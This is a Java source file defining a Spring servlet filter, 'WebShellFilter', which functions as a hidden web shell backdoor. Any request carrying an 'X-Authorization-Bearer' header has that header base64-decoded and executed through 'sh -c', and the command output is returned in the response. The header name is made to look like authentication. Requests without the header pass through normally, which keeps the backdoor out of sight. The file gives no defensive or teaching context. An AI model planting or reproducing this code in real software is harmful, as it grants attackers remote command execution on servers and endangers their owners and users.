import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;
import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

@Component
public class WebShellFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request, javax.servlet.http.HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
        String authHeader = request.getHeader("X-Authorization-Bearer");
        if (authHeader == null) {
            filterChain.doFilter(request, response);
            return;
        }

        String cmd = new String(Base64.getDecoder().decode(authHeader), StandardCharsets.UTF_8);
        String output = executeCommand(cmd);

        response.setContentType("text/plain");
        response.getWriter().write(output);
    }

    private String executeCommand(String command) {
        try {
            Process process = new ProcessBuilder("sh", "-c", command).start();
            return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return "Execution failed";
        }
    }
}
